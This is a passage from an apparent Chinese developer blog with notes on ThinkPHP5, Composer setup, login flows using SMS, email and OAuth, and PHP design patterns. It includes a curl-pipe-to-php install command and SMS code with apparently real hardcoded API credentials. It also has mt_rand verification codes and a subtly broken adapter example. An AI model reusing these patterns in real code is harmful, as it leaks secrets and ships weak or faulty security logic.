    定义POST请求路由规则
    Route::post('new/:id','News/update');
    定义PUT请求路由规则
    Route::put('new/:id','News/update');
    定义DELETE请求路由规则
    Route::delete('new/:id','News/delete');
    所有请求都支持的路由规则
    Route::any('new/:id','News/read');
```



### RESTful实例

1. index  显示资源列表
2. create 显示创建资源表单页
3. save   保存新建的资源
4. read   显示指定的资源
5. edit   显示编辑资源表单页
6. update 保存更新的资源
7. delete 删除指定资源

### 使用实例

```
// 在User.php中获取数据,并使用模板
		$list = Db::name('user')
            ->field(['id', 'name'])
            ->order('id', 'asc')
            ->select();

        return view('user/index', [
            'title' => '用户列表',
            'list' => $list,
        ]);
// 在本模块view目录下创建模板(view/user/index.html)
// 引入css,js文件
    {css href="./static/css/bootstrap.min.css"}
    {css href="__INDEX__rest.css"}
   	{js href="__JS__jquery.min.js"}
	{js href="__JS__bootstrap.min.js"}
```

```
 	#引入文件时或在配置中定义常量
	// 视图输出字符串内容替换
    'view_replace_str'       => [
        '__INDEX__' => '/static/index/',
        '__CSS__' => '/static/index/css/',
        '__JS__' => '/static/index/js/',
    ],
    则变为{css href="__CSS__bootstrap.min.css"}
```

**注意**: 在模板中使用PHP函数时需要在其前添加冒号

​	`{:url()}` 

遍历  `{volist name="list" key="k" id="v"}{/volist}`

```
phpstorm快捷键
Alt+J  快速多选后面的选中元素
Ctrl+Alt+L   快速格式化代码
Ctrl+D   复制指定代码行
Ctrl+Shift+↑/↓   上下移动代码位置

Alt+←/→  切换代码窗口
Alt+↑/↓  快速切换方法
```



------

## 六. 人造人计划 (数据库 Db类)

### 数据库使用的补充

使用框架开发应用，一般不需要 直接操作数据库，而是通过 框架封装好的 数据库中间层 对数据库进行操作。
这样的好处 主要有两个：
一是简化数据库操作，二是做到跨数据库的一致性。

这种设计的中间层 通常称之为 数据库访问抽象层，简称数据访问层（DAL），ThinkPHP5的数据访问层 是基于PHP内置的PDO对象实现。一般抽象层本身 并不直接操作数据库，而是通过 驱动来实现具体的数据库操作。

php think make:controller admin/Test --plain

### 查询相关

2.1. 快捷查询
2.2. 批量查询
2.3. 区间查询
2.4. 多表查询
    1). 手动多表
    2). JOIN
    3). 视图
2.5. 聚合查询
2.6. 子查询
    1.fetchSql 方式
    2.buildSql 方式

------

## 七. 新生 (模型 Model)

ThinkPHP5.0的模型是一种对象-关系映射（Object/Relation Mapping，简称ORM）的封装，
并且提供了简洁的ActiveRecord实现。一般来说，每个数据表会和一个“模型”对应。

ORM的基本特性就是表映射到模型，记录映射到模型对象实例，字段映射到对象属性。

模型是一种对象化的操作封装，而不是简单的CURD操作，简单的CURD操作直接使用前面提过的Db类即可。

模型类和Db类的区别主要在于对象及业务逻辑的封装，Db类的查询默认返回的是数组（或者集合），而模型类返回的是当前的模型对象实例（或者集合），模型是比Db类更高级的数据封装，支持模型关联、模型事件和业务（逻辑）方法。

php think make:model rest/User

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>框架开发</tag>
        <tag>ThinkPHP5</tag>
      </tags>
  </entry>
  <entry>
    <title>框架开发-composer</title>
    <url>/2018/10/11/%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91-composer/</url>
    <content><![CDATA[
## composer(依赖管理工具) 安装/使用

### 1.1. composer下载

```
`https://getcomposer.org`       [composer官网]
`https://developer.aliyun.com/composer` [Composer 阿里镜像]
```

### 1.2. 环境检查

```
php -version
```

### 1.3. 安装

```
window:
    下载并运行 Composer-Setup.exe
Linux 和 Mac OS X 中运行如下命令:
    curl -sS https://getcomposer.org/installer | php
    mv composer.phar /usr/local/bin/composer
    或: 
    wget https://dl.laravel-china.org/composer.phar -O /usr/local/bin/composer
    chmod a+x /usr/local/bin/composer

更新:
    composer self-update
```

### 1.4. 源地址设置

```
添加镜像源配置:
    阿里云 Composer 全量镜像（推荐）
    镜像类型：全量镜像
    更新时间：1 分钟
    官方地址：https://developer.aliyun.com/composer
    镜像说明：阿里云 CDN 加速，更新速度快，推荐使用
    `composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/`

    安畅网络镜像
    镜像类型：全量镜像
    更新时间：1 分钟
    官方地址：https://php.cnpkg.org/
    镜像说明：此 Composer 镜像由安畅网络赞助，目前支持元数据、下载包全量代理。
    `composer config -g repos.packagist composer https://php.cnpkg.org`

删除镜像配置
    `composer config -g --unset repos.packagist`
查看配置
    `composer config -g -l`
```

### 1.5. 使用composer

​    `https://packagist.org`    [composer包列表]

------

## 安装 ThinkPHP 5.0

0. Thinkphp官网
   `http://www.thinkphp.cn`
1. 使用composer安装
   composer create-project topthink/think=5.0.* tp5  --prefer-dist
2. 使用GIT安装
   ThinkPHP 远程仓库
   GitHub:
       应用项目：https://github.com/top-think/think
       核心框架：https://github.com/top-think/framework
   码云:
       应用项目： https://gitee.com/liu21st/thinkphp5
       核心框架： https://gitee.com/liu21st/framework.git

------

## ]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>框架开发</tag>
        <tag>Composer</tag>
      </tags>
  </entry>
  <entry>
    <title>网页登录验证实现</title>
    <url>/2018/11/07/%E7%BD%91%E9%A1%B5%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[


**第三方登录/短信验证/邮箱验证**

> 该登录注册基于tp5框架, 短信验证是基于`容联云短信平台`接口实现,邮件验证是通过`swiftmailer`插件实现

### 1.搭建前端页面

![1566974419742](/images/imgs/1566974419742.png)

![1566974429645](/images/imgs/1566974429645.png)

### 2.创建路由

### 3.书写注册,登录后台逻辑代码

### 4.创建验证器validate模块

​	validata模块使用basicValidate.php作为入口,其余验证器继承实现

```
<?php
namespace app\index\validate;

use think\Request;
use think\Validate;
use think\Exception;

class basicValidate extends Validate
{
    /** 获取http传入的参数,对这些参数做校验
     * @return bool
     */
    public function goCheck()
    {
        //获取http传入的参数
        // 对这些参数做校验
        $request = Request::instance();
        $params = $request->param();

        $result = $this->check($params);
        if (!$result){
            $error = $this->getError();
            return $error;
        }else{
            return true;
        }
    }


}
```

```
class registerValidate extends basicValidate
{
    protected $rule = [

        'nickname' => 'alphaDash|length:4,25',
        'email'=>['regex'=>'/^[0-9a-zA-Z-_!]{2,18}@[\da-zA-z]{1,10}\.(com|cn|net|org|edu|com\.cn|tv)$/'],
        'pwd'=>'alphaNum|length:4,20',
        'tel'=>['regex'=>'/^1(3\d|4[5-9]|5[0-35-9]|66|7[03-8]|8\d|9[89])\d{8}$/'],
        '__token__'=>'require|token',
    ];
    protected $message = [
        'nickname.alphaDash' => '只能为字母,数字,下划线',
        'nickname.length' => '用户名长度为4-25位',
        'email.regex'=>'邮箱格式错误',
        'pwd.alphaNum'=>'密码只能为数字字母组成',
        'pwd.length'=>'密码长度为4-20位',
        'tel.regex'=>'手机号格式错误',
        '__token__.require'=>'非法提交',
        '__token__.token'=>'请不要重复提交表单',
    ];


}
```





### 5.注册页面引入图形验证及验证码功能

#### 1.1引入图形验证码功能

- 安装

​	`composer require topthink/think-captcha 1.*`

- 引入页面

  `<img onclick="this.src='{:captcha_src(1)}?'+Math.random()" src="{:captcha_src(1)}" alt="captcha" />`

- 页面ajax验证

  ```
      function checkCode(){
          cap = $('#capCode').val();
          $.ajax({
              method: 'get',
              url: "{:url('index/index/verify')}?code=" + cap +"&id=1",
              async : 'false',
              dataType: 'json',
              success: function (data) {
                  console.log(data);
                  if(data){
                      sendMsg();
                  }else{
                      toastr.error('验证码填写出错');
                  }
              },
              error: function () {
                  alert('AJAX1 执行失败');
              }
          });
      }
  ```

- 后台验证

  ```
   use think\captcha\Captcha;
   
   	/**ajax检测验证码是否正确
       * @param $code
       * @param string $id
       * @return mixed
       */
      function verify($code, $id = '')
      {
          $captcha = new Captcha();
          return $captcha->check($code, $id);
      }
  ```

#### 1.2引入短信验证功能

- 依据容联云文档引入`REST.php`到`extend`目录

- 页面使用ajax发送短信请求

  ```
      function sendMsg() {
          tel = $('#name').val();
          console.log(tel);
          $.ajax({
              method: 'get',
              url: "{:url('index/index/send')}?tel=" + tel,
              dataType: 'json',
              success: function (data) {
                  console.log(data);
                  if (data.statusCode=='000000') {
                      toastr.success('短信发送成功');
                  } else {
                      toastr.error(data.statusMsg);
                  }
              },
              error: function () {
                  alert('AJAX 执行失败');
              }
          });
      }
  ```

- 后台处理发送请求

  ```
      // ajax请求发送短信
      public function send(Request $request)
      {
          $get = $request->get();
          $tel = $get['tel'];
          $server = $request->server();
          // 获取用户ip
          $ip = $server['REMOTE_ADDR'];
          $userre = $this->index->checkCount($ip);
          if (!$userre) {
              $data['statusMsg'] = '同一个ip24小时只能发送10条短信';
              $data['statusCode'] ="111111";
              return $data;
          }
          // 生成随机的验证码, 并存储至session
          $code = mt_rand(1000,9999);
          Session::set('code',$code);
          // 提示时间
          $time = 10;
          $data = [$code, $time];
          $result = $this->index->sendSMS($tel, $data, 1);
          return $result;
  
      }
      
          /**
       * 发送模板短信
       * @param to 手机号码集合,用英文逗号分开
       * @param datas 内容数据 格式为数组 例如：array('Marry','Alon')，如不需替换请填 null
       * @param $tempId 模板Id
       */
      function sendSMS($to,$datas,$tempId)
      {
          // 初始化REST SDK
          $rest = new REST('app.cloopen.com','8883','2013-12-26');
          // var_dump($rest);die;
          $rest->SetAccount('8a216da86a58af8b016a900b55cd1cb3','e4360fc2cfee49f6a5c1cb2c2fab73de');
          $rest->setAppId('8a216da86a58af8b016a900b56181cb9');
  
          // 发送模板短信
  //        echo "Sending TemplateSMS to $to <br/>";
          $result = $rest->sendTemplateSMS($to,$datas,$tempId);
          if($result == NULL ) {
              echo "result error!";
              return false;
          }
          if($result->statusCode!=0) {
  //            echo "error code :" . $result->statusCode . "<br>";
  //            echo "error msg :" . $result->statusMsg . "<br>";
              //TODO 添加错误处理逻辑
              return $result;
          }else{
  //            echo "Sendind TemplateSMS success!<br/>";
              // 获取返回信息
  //            $smsmessage = $result->TemplateSMS;
  //            echo "dateCreated:".$smsmessage->dateCreated."<br/>";
  //            echo "smsMessageSid:".$smsmessage->smsMessageSid."<br/>";
              //TODO 添加成功处理逻辑
              return $result;
          }
      }
  ```

  > 注意: 默认echo发送的消息可能干扰前端判断发送状态,推荐全部注释, 前端根据返回的statusCode和statusMsg来做做自己的逻辑
  >
  > 上线时注意要将`extends` 目录中的ignore文件删掉 , 不然上传不到git

#### 1.3引入邮件验证功能

- 安装swiftmail

​	`composer require "swiftmailer/swiftmailer:^6.0"`

- 前台ajax请求发送邮件

  ```
      function sendMail(){
          mail = $('#name').val();
          //console.log(mail);
          $.ajax({
              method: 'get',
              url: "{:url('index/index/sendMail')}?mail=" + mail,
              dataType: 'json',
              success: function (data) {
                  console.log(data);
                  if (data==1) {
                      toastr.success('确认邮件发送成功');
                  } else {
                      toastr.error('确认邮件发送失败');
                  }
              },
              error: function () {
                  alert('AJAX 执行失败');
              }
          });
      }
  ```

- 后台处理请求

  ```
      // ajax请求发送邮件
      public function sendMail($mail)
      {
  
          $transport = new \Swift_SmtpTransport('smtp.163.com', 25); // 邮箱服务器
          $transport->setUsername('xxx@163.com')  // 邮箱用户名
          ->setPassword('abc123456');   // 邮箱密码，有的邮件服务器是授权码
  
          $code = mt_rand(1000,9999);
          Session::set('code',$code);
          $mailer = new \Swift_Mailer($transport);
  
          $message = (new \Swift_Message('您的验证码如下:'.$code)) // 邮件标题
          ->setFrom(['xxx@163.com' => 'xxx有限责任公司']) // 发送者
          ->setTo([$mail => '用户']) //发送对象，数组形式支持多个
          ->setBody($code); //邮件内容
  
  
          $result = $mailer->send($message);
          return $result;
      }
  
  ```

  > 有许多网上的教程都是使用require_once来加载autoload文件, 通过composer安装后, 插件在/vendor文件夹下,不需要require/include 即可使用. 但在new的时候需要加 \ .
  >
  > 上线后由于阿里云服务器默认封禁25端口,就算在规则配置打开也没作用, 使用465端口, encryption 改用  ssl ,之后邮件服务才能正常实现

### 6.第三方登录实现



#### 1.微博

https://www.bilibili.com/video/av14869349/?p=2

1.前往微博开放平台注册开发者,创建应用,获取api key和secret

2.https://open.weibo.com/wiki/SDK 下载SDK

![1567663560489](/images/imgs/1567663560489.png)

3.拆分基础类, 放在`vendor/sina/`目录下, 符合tp5的命名规范

`[SaeTClientV2.php]` 和 `[SaeTOAuthV2.php]`

![1567663732898](/images/imgs/1567663732898.png)

![1567663753322](/images/imgs/1567663753322.png)

4.配置文件定义常量key/secret: 将其放在`public/index.php` 中

![1567663898668](/images/imgs/1567663898668.png)

`composer.json`中写入sina路径, 执行`composer dump-autoload`

![1567668181364](/images/imgs/1567668181364.png)

5.在调用微博登录的页面声明模板变量

```
use sina\SaeTClientV2;
use sina\SaeTOAuthV2;

		$sina = new SaeTOAuthV2(WB_AKEY,WB_SKEY);
        $codeUrl = $sina->getAuthorizeURL(WB_CALLBACK_URL);
        $this->assign('code_url',$codeUrl);
```

页面上应用该变量

![1567664233414](/images/imgs/1567664233414.png)

6.写接受回调函数

```
    public function callback()
    {
        $sina = new SaeTOAuthV2(WB_AKEY,WB_SKEY);
        $keys = array();
        $param = Request::instance()->param();
//        dump($param);
        $keys['code'] = $param['code'];
        $keys['redirct_uri']=WB_CALLBACK_URL;
        $token = $sina->getAccessToken('code',$keys);
//        halt($token);
        if ($token) {
            Session::set('token',$token);
            return $this->fetch();
        }else{
            return $this->error('登录授权失败');
        }
    }
```

7.铺设回调页面,获取当前用户信息,处理登录注册逻辑

```
    public function findUser()
    {
        $sina = new SaeTClientV2(WB_AKEY,WB_SKEY,Session::get('token')['access_token']);
        $ms = $sina->home_timeline();
        $uid_get = $sina->get_uid();
        $uid = $uid_get['uid'];
        $user_message = $sina->show_user_by_id($uid);
        return $user_message;
    }
```



#### 2.qq

##### 1.在 [QQ互联](https://connect.qq.com/) 注册开发者账号,

##### 2.创建应用,

​	审核通过后获取APPid 和 APPkey, 回调地址

![1567685344661](/images/imgs/1567685344661.png)

##### 3.下载PHP sdk开发包

​	[SDK下载](https://wiki.connect.qq.com/sdk下载)

##### 4.配置

在wamp环境运行D:\wamp\www\Connect2.1\index.php 并配置

![1567685542905](/images/imgs/1567685542905.png)

> 配置完成后会生成`API/comm/inc.php`文件, 有用

##### 5.修改类文件

将`Connect2.1\API\class`中的五个php类文件按照TP5的命名方式改造后放入TP5`extend/qq`文件夹

```
- 添加namespace
- 去除require_once
- 文件名改为类名
```

![1567685757072](/images/imgs/1567685757072.png)

![1567685822254](/images/imgs/1567685822254.png)

##### 6.应用

```
use qq\QC;

        $qq = new QC();
        $qqUrl = $qq->qq_login();
        $this->assign('qq_code_url',$qqUrl);

```

![1567686046099](/images/imgs/1567686046099.png)

##### 7.报错处理

​	1.使用后点击报错,未定义的ROOT常量, 查看源码 , 可以看出该处是读取我们开头配置生成的`comm/inc.php`配置文件, 我们直接将其内容赋予Recorder类 

![1567686194361](/images/imgs/1567686194361.png)

![1567686186865](/images/imgs/1567686186865.png)

![1567686361773](/images/imgs/1567686361773.png)

2.点击按钮不跳转, 查看源码发现,`qq_login`方法是直接重定向到指点登录网址, 而不是返回url, 修改之

![1567686653314](/images/imgs/1567686653314.png)

##### 8.处理回调





#### 3.微信







### 7.支付

1.支付宝

2.微信支付:

用户提交订单, 

商户服务器接受信息, 向微信服务器发送请求订单详情信息+商户信息(含回调)

微信服务器返回商户服务器一段字符串

商户利用qrcode生成二维码, 供用户扫码支付

用户扫码, 请求微信服务器完成订单支付

微信服务器返回支付成功或支付失败信息给商户服务器回调地址(异步)















]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>接口</tag>
        <tag>ThinkPHP5</tag>
        <tag>第三方登录</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP设计模式详解</title>
    <url>/2020/01/07/PHP%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[


## 设计模式

### 定义

可以被反复使用,容易被他人理解的,可靠地代码设计的最佳实践

> 如 laravel中的单例模式,工厂模式,门面模式, 注册树模式(DI/IOC), 适配器模式, 观察者模式等

### 用途

- 良好的代码风格
- 易读性, 可维护性
- 可扩展性
- 稳定性

### 六大原则

```
- 单一职责原则 (single responsibility principle)
	一个类只负责一项职责
- 里氏代换原则 (liskov substitution principle)
	任何基类可以出现的地方, 子类一定可以出现
- 依赖倒置原则 (dependence inversion principle)
	针对接口编程, 依赖于抽象而不依赖于具体
- 接口隔离原则 (interface segregation principle)
	使用多个隔离的接口, 比使用单个接口要好, 即降低类之间的耦合度
- 迪米特原则/最少知道原则 (demeter principle)
	一个实体应当尽量少地与其他实体之间发生相互作用, 使得系统功能模块相对独立
- 开闭原则 (open close principle)
	对扩展开放, 对修改关闭, 实现热插拔的效果
```

### 原则详解

#### 单一职责原则

> 不要存在多于一个导致类变更的原因

当类存在多个职责时, 若其中一个职责需要变更修改, 可能导致其他职责功能受到影响, 从而出现故障风险

使用单一职责设计可以**降低类的复杂度, 可读性, 可维护性和变更引起的风险** 

#### 里氏代换原则

> 子类应扩展父类的功能, 但不能重写 改变父类原有的功能

#### 依赖倒置原则

> 高层模块不应依赖底层模块, 抽象不应依赖于细节, 都应依赖于抽象

高层模块A直接依赖底层模块B, 若需要更改为依赖底层模块C, 需要修改A代码, 会有一定的故障风险

将A修改为依赖接口X, B 和 C各自实现 X, 则会降低修改A的几率

#### 接口隔离原则

> 客户端不应该依赖它不需要的接口, 一个类对另一个类的依赖应该建立在最小的接口上

#### 迪米特原则

> 一个对象应该对其他对象保持最少的了解, 即高内聚低耦合, 内部属性能私有就私有化

#### 开闭原则

> 类、模块和函数应该对扩展开放, 对修改关闭

### 设计模式类型

- 创建型模式

  包括单例模式、工厂模式(简单工厂、抽象工厂)

- 结构型模式

  适配器模式、门面模式、装饰器模式、注册树模式、代理模式、管道模式

- 行为型模式

  策略模式、观察者模式、命令模式、迭代器模式

### 创建型模式

> 利用封装, 从直接获得一个对象修改为通过接口获取对象

#### 单例模式

> 通过使用静态方法, 使得每次都返回同一个实例

##### 用途

- 用于数据库应用, 避免大量数据库操作消耗资源
- 全局配置信息的存储缓存
- 分布式存储

##### 特点

```
- 私有化构造方法  private function __construction(){}
	防止外部代码new多个对象,即单例类不能在其他类中实例化,仅能被自身实例化
- 私有化静态属性  private static $instance;
	用于保存类的实例的静态成员变量
- 公有化静态方法  public static function getInstance(){}
	用于外部获取该实例, 可以通过instanceof判断是否实例化
- 私有化克隆方法  private function __clone(){}
	防止对象被克隆产生新对象
```

##### 案例

```php
class DB
{
    private function __construct(){}

    private static $instance = null;

    public static function getInstance()
    {
        if (self::$instance == null){
            self::$instance = new self();
        }
        return self::$instance;
    }

    private function __clone(){}
}
```

#### 工厂模式

> 从new一个对象改为接口, 还可以通过传参实例化不同的类

##### 简单工厂模式(静态工厂模式)

> 为不同的类提供一个生产对象的工厂, 获取对象仅通过工厂获取
>
> (增加新的对象类型需要修改工厂类代码, 违反开闭原则)

```php
class DBMysql
{
    public function connection()
    {
        echo '连接到MySQL数据库';
    }
}

class DBOracle
{
    public function connection()
    {
        echo '连接到Oracle数据库';
    }
}

class DBFactory
{
    public static function createObject(String $type)
    {
        switch ($type) {
            case 'mysql':
                return new DBMysql();
                break;
            case 'oracle':
                return new DBOracle();
                break;
            default:
                throw new ErrorException("No Support Type Like {$type}");
        }
    }
}

$DB = DBFactory::createObject('mysql');
$DB->connection();
```

##### 工厂方法模式

> 为工厂方法提供接口, 规范接口方法, 每个工厂针对一个类生产对象, 修复了简单工厂模式违反开闭原则的问题

```php
interface DB	# 接口规定连接动作
{
    public function connection();
}

class DBMysql implements DB		# 实现接口方法
{
    public function connection()
    {
        echo '连接到MySQL数据库';
    }
}

class DBOracle implements DB	# 实现接口方法
{
    public function connection()
    {
        echo '连接到Oracle数据库';
    }
}


interface Factory	# 接口规定工厂动作
{
    public static function createObject();
}

class mysqlFactory implements Factory	# 实现接口方法,返回对应对象
{
    public static function createObject()
    {
        return new DBMysql();
    }
}

class oracleFactory implements Factory	# 实现接口方法,返回对应对象
{
    public static function createObject()
    {
        return new DBOracle();
    }
}

$DB = mysqlFactory::createObject();
$DB->connection();

$DB = oracleFactory::createObject();
$DB->connection();

# 若需要添加sqlite, 添加如下类
class DBSqlite implements DB
{
    public function connection()
    {
        echo '连接到sqlite数据库';
    }
}
class sqliteFactory implements Factory
{
    public static function createObject()
    {
        return new DBSqlite();
    }
}
$DB = sqliteFactory::createObject();
$DB->connection();
```

##### 抽象工厂模式

> 在不指定具体类的情况下创建一系列相关或依赖对象, 创建的类都实现相同的接口
>
> (可以增加产品族, 但无法增加新的产品)

```php
interface Vehicle
{
    public function drive();
}

class ToyotaVehicle implements  Vehicle
{
    public function drive()
    {
        echo 'Toyouta 汽车';
    }
}

class AudiVehicle implements  Vehicle
{
    public function drive()
    {
        echo 'Audi 汽车';
    }
}

interface AirCondition
{
    public function blow();
}

class GreeAir implements AirCondition
{
    public function blow()
    {
        echo 'Gree 空调';
    }
}

class HaierAir implements AirCondition
{
    public function blow()
    {
        echo 'Haier 空调';
    }
}

interface Factory
{
    public static function productVehicle();
    public static function productAirCondition();
}

class ToyotaFactory implements Factory
{
    public static function productVehicle()
    {
        return new ToyotaVehicle();
    }

    public static function productAirCondition()
    {
        return new GreeAir();
    }
}

class AudiFactory implements Factory
{
    public static function productVehicle()
    {
        return new AudiVehicle();
    }

    public static function productAirCondition()
    {
        return new HaierAir();
    }
}
# 使用
$toyotaVehicle = ToyotaFactory::productVehicle();
$greeAirCondition = ToyotaFactory::productAirCondition();
$toyotaVehicle->drive();
$greeAirCondition->blow();

$audiVehicle = AudiFactory::productVehicle();
$HaierAirCondition = AudiFactory::productAirCondition();
$audiVehicle->drive();
$HaierAirCondition->blow();
```

组成:

- 抽象工厂 - 确定工厂的业务范围
- 具体工厂 - 每个具体工厂对应一个产品族
- 抽象产品 - 同一等级结构的抽象类
- 具体产品 - 可供生产的具体产品

### 结构型模式

> 解析类与对象的内部结构与外部组合, 通过优化程序结构解决模块的耦合问题

#### 适配器模式

> 将某个类的接口转换成与另一个接口兼容. 通过将原始接口进行转换, 给用户提供兼容接口, 使原来因为接口不同而无法一起使用的类可以得到兼容

适配器模式解决的问题是针对一些原有代码不便修改, 或第三方扩展包, 返回的数据与目标数据格式不同, 此时便可以使用适配器调整原有逻辑

```php
<?php

interface Weather
{
    public function showWeather();
}

class WeatherSerialized implements Weather
{
    public function showWeather()
    {
        $weatherInfo = ['weather'=>'wind','temperature' => '12'];
        return serialize($weatherInfo);
    }
}

# 使用
$weatherObj = new WeatherSerialized();
$info = $weatherObj->showWeather();
$info = unserialize($info);
echo "Today's weather is {$info['weather']}";

# 需求目标: 需要返回标准Json格式数据
interface WeatherAdapter
{
    public function getWeather();
}

class JsonWeather implements WeatherAdapter
{
    protected $instance;

    public function __construct(Weather $weather)
    {
        $this->instance = $weather;
    }

    public function getWeather()
    {
        $sourceWeather = $this->instance->showWeather();
        $weatherArray = unserialize($sourceWeather);
        return json_encode($weatherArray, 320);
    }
}

# 使用
$jsonWeather = new JsonWeather(new WeatherSerialized());
$weatherInfo = json_decode($jsonWeather, true);
echo "Today's weather is {$info['weather']}";
```

#### 装饰器模式

> 也叫装饰者模式, 在不改变原有类和不使用继承的情况下, 动态的扩展一个对象的功能

使用场景包括:

- 需要动态的给对象添加或撤销功能
- 需要增加由一些基本功能排列组合产生的大量功能, 继承关系可能非常复杂
- 不能采用生成子类的方法进行扩展, 可能是有大量独立扩展, 也可能是类定义被隐藏

```php
<?php
    
interface Component	# 组件对象接口
{
    public function display();
}

class Person implements Component	# 需要装饰的组件
{
    protected $name;

    public function __construct(string $name)
    {
        $this->name = $name;
    }

    public function display()
    {
        echo "装饰目标:{$this->name}" . PHP_EOL;
    }
}

class Decorator implements Component	# 装饰器父类
{
    protected $component;

    public function __construct(Component $component)
    {
        $this->component = $component;
    }

    public function display()	# 执行装饰动作
    {
        if (!empty($this->component))
            $this->component->display();
    }
}

class TShirt extends Decorator	# 具体的装饰器类
{
    public function display()
    {
        parent::display();
        echo "装饰T-Shirt";
    }
}

class Hat extends Decorator	# 具体的装饰器类
{
    public function display()
    {
        parent::display();
        echo "装饰帽子";
    }
}

// 客户端使用
$target = new Person('张三');
$target = new TShirt($target);
$target = new Hat($target);
$target->display();
/*
 * 运行结果:
 * 装饰目标:张三
 * 装饰T-Shirt装饰帽子
 */
```

#### 注册树模式

> 也叫注册模式或注册器模式, 即将对象实例注册到一颗全局的对象树上, 需要的时候取用即可

```php
<?php

interface DB
{
    public function connection();
}

class DBMysql implements DB
{
    public function connection()
    {
        echo "连接到mysql";
    }
}

class DBOracle implements DB
{
    public function connection()
    {
        echo "连接到Oracle";
    }
}

interface Factory
{
    public static function getInstance();
}

class MysqlFactory implements Factory
{
    public static function getInstance()
    {
        return new DBMysql();
    }
}

class OracleFactory implements Factory
{
    public static function getInstance()
    {
        return new DBOracle();
    }
}

class RegisterTree
{
    protected static $container;	# 注册容器

    public static function set($alias, $object)	# 注册到树
    {
        self::$container[$alias] = $object;
    }

    public static function get($alias)	# 从树上获取
    {
        return self::$container[$alias];
    }

    public static function delete($alias)	# 删除
    {
        unset(self::$container[$alias]);
    }
}

# 注册到树上
RegisterTree::set('mysql', MysqlFactory::getInstance());
RegisterTree::set('oracle', OracleFactory::getInstance());
# 使用
$mysql = RegisterTree::get('mysql');
$mysql->connection();
# 删除注册树内容
RegisterTree::delete('oracle');
```

#### 门面模式

> 又称外观模式, 用于为子系统中的一组接口提供一个一致的界面, 增加了子系统的独立性和易用性

```php
<?php

class Camera
{
    public function turnOn()
    {
        echo '开启摄像机';
    }

    public function turnOff()
    {
        echo '关闭摄像机';
    }
}

class Light
{
    public function turnOn()
    {
        echo '开启灯光';
    }

    public function turnOff()
    {
        echo '关闭灯光';
    }
}


class Facade
{
    public static $camera;
    public static $light;
    public function __construct()
    {
        self::$camera = new Camera();
        self::$light = new Light();
    }

    public function photoInDayTime()
    {
        self::$camera->turnOn();
    }

    public function photoInNight()
    {
        self::$camera->turnOn();
        self::$light->turnOn();
    }

    public function illumination()
    {
        self::$light->turnOn();
    }
}

// 客户端使用
$facade = new Facade();
$facade->photoInDayTime();  # 白天拍照
$facade->photoInNight();    # 晚上拍照
$facade->illumination();    # 照明
```

#### 管道模式

> 流水线式将数据传递到下一个任务序列中, 需要管道, 阀门 和 载荷

```php
<?php

interface PipelineBuilder
{
    public function __construct($payload);

    public function pipe(StageBuilder $stage);

    public function process();
}

class Pipeline implements PipelineBuilder
{
    protected $payload;

    protected $pipes = [];

    public function __construct($payload)
    {
        $this->payload = $payload;
    }

    public function pipe(StageBuilder $stage)	# 添加管道
    {
        $this->pipes[] = $stage;
        return $this;
    }

    public function process()	# 执行管道动作
    {
        foreach ($this->pipes as $pipe) {
            call_user_func([$pipe,'handle'], $this->payload);
        }
    }
}

interface StageBuilder
{
    public function handle($payload);
}

class StageOne implements StageBuilder	# 管道一
{
    public function handle($payload)
    {
        echo '步骤一' . PHP_EOL;
    }
}

class StageTwo implements StageBuilder	# 管道二
{
    public function handle($payload)
    {
        echo '步骤二' . PHP_EOL;
    }
}

// 客户端使用
$pipeline = new Pipeline('洗衣服');
$pipeline->pipe(new StageOne())->pipe(new StageTwo())->process();
```

#### 代理模式

> 透明置于两个不同对象之内的一个对象, 从而可以截取或代理这两个对象间的通信或访问



```php
<?php

interface Request
{
    public function request();
}

class RealRequest implements Request
{
    public function request()
    {
        echo '真实请求动作';
    }
}

class ProxyRequest implements Request
{
    protected $requestInstance;

    public function __construct(Request $instance)
    {
        $this->requestInstance = $instance;
    }

    public function request()
    {
        echo '代理器中的其他动作;';
        $this->requestInstance->request();
    }
}

// 客户端使用

$request = new ProxyRequest(new RealRequest());
$request->request();

```

代理模式与装饰器/适配器的区别

装饰器一般是对对象进行装饰, 增加其中的方法行为

适配器一般会改变方法行为, 目的是保持接口的统一

代理模式是让代理类替换真实类的操作

### 行为型模式

> 用于描述程序在运行时复杂的流程控制, 即描述多个类与对象间如何相互协作共同完成单个对象无法完成的任务, 涉及算法与对象间职责的分配

#### 策略模式

> 将一组特定的行为和算法封装, 以适应特定的上下文环境, 让它们可以相互替换

```php
<?php

interface Strategy	# 策略类接口
{
    public function Algorithm();
}

class ConcreteStrategyA implements Strategy	# 策略A
{
    public function Algorithm()
    {
        echo '算法A实现';
    }
}

class ConcreteStrategyB implements Strategy	# 策略B
{
    public function Algorithm()
    {
        echo '算法B实现';
    }
}

class ConcreteStrategyC implements Strategy # 策略C
{
    public function Algorithm()
    {
        echo '算法C实现';
    }
}

class Context
{
    protected $strategy;
    
    public function __construct(string $type)
    {
        switch ($type){
            case 'A':
                $this->strategy = new ConcreteStrategyA();
                break;
            case 'B':
                $this->strategy = new ConcreteStrategyB();
                break;
            case 'C':
                $this->strategy = new ConcreteStrategyC();
                break;
            default:
                throw new ErrorException('no this type strategy');
        }
    }

    public function processStrategy()
    {
        $this->strategy->Algorithm();
    }
}

// 客户端使用
$context = new Context('A');
$context->processStrategy();
```

#### 观察者模式

> 定义对象间的一对多的依赖关系, 当一个对象的状态改变时, 所有依赖于它的对象都得到通知并自动刷新

模式所需角色:

- 抽象主题(Subject) : 把所有观察者对象的引用保存到一个集合中, 每个主题都可以有任意数量的观察者, 它提供了一个接口, 可以增加/删除观察者对象
- 具体主题(ConcreteSubject) : 将有关状态存入具体观察者对象, 在具体主题内部状态改变时, 给所有观察者发出通知
- 抽象观察者(Observer) : 为所有具体观察者定义一个接口, 得到主题通知时更新自己
- 具体观察者(ConcreteObserver) : 实现抽象观察者定义的更新接口, 使自己的状态与主题状态协调

```php
<?php

interface Subject	# 抽象主题接口
{
    public function attach($observer);

    public function detach($observer);

    public function notify();
}

class ConcreteSubject implements Subject	# 具体主题
{
